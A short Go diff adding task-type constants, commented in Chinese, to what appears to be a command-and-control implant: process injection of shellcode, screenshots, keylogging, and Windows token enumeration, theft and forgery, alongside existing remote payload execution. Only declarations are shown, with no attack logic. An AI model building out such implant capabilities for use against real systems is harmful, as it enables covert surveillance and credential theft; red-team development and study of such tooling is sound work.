@@ -92,6 +92,14 @@ const (
 	TaskPrivInfo   TaskType = 0x0401 // 权限信息
 	TaskSysInfo    TaskType = 0x0402 // 系统信息
 	TaskPayload    TaskType = 0x0501 // 远程载荷执行
+	TaskInject     TaskType = 0x0502 // 进程注入（pid+shellcode）
+	TaskScreenshot TaskType = 0x0601 // 截屏
+	TaskKeylogOn   TaskType = 0x0602 // 启动键盘记录
+	TaskKeylogOff  TaskType = 0x0603 // 停止键盘记录并获取结果
+	TaskTokenEnum  TaskType = 0x0701 // 枚举 Token
+	TaskTokenSteal TaskType = 0x0702 // 窃取 Token
+	TaskTokenRev2  TaskType = 0x0703 // 恢复身份
+	TaskTokenMake  TaskType = 0x0704 // 伪造 Token
 	TaskExit       TaskType = 0x0F01 // 退出
 )
 
